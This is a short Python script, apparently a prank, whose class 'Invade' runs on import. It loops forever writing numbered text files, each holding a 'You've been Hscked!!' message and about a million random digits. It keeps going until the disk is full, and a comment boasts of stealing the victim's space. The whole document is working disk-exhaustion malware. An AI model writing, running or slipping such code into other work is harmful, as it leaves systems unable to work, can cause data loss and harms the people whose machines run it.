import random
import os

class Invade:
    def __init__(self):
        # I AM HERE THE STEAL YOUR SPACE
        j = 1
        while True:
            i = [0, 1]
            file_name = 'file{0}.txt'.format(j)
            with open(file_name, 'w') as f:
                b = random.choice(i)
                f.write("You've been Hscked!!{0}[-a]\n".format(b))
            with open(file_name, 'a') as g:
                c = [random.choice(i) for u in range(1000000)]
                g.write(str(c))
            j += 1


Invade()